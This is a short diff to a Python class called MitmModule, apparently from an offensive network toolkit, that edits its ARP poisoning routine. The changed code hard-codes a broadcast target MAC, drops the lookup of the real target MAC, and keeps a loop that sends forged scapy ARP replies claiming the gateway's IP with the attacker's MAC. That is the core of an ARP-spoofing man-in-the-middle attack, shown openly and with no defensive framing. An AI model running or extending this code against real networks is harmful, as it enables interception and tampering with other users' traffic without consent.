@@ -36,7 +36,7 @@ class MitmModule(BaseModule):
         # Module state
         self.is_poisoning = False
         self.target_ip = None
-        self.target_mac = None
+        self.target_mac = "FF:FF:FF:FF:FF:FF"
         self.target_mac_list = None
         self.target_ip_list = None
         self.gateway_ip = None
@@ -171,9 +171,7 @@ class MitmModule(BaseModule):
             })
             
             # TODO: Implement actual ARP poisoning
-            print("Starting poison thread")
-            self.target_mac = network.get_mac_address(self.target_ip) # Get target mac
-            while True:
+            while self.is_poisoning:
                 arp_response = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.self_mac)
                 scapy.send(arp_response, verbose=False)
                 print("Sent ARP response")
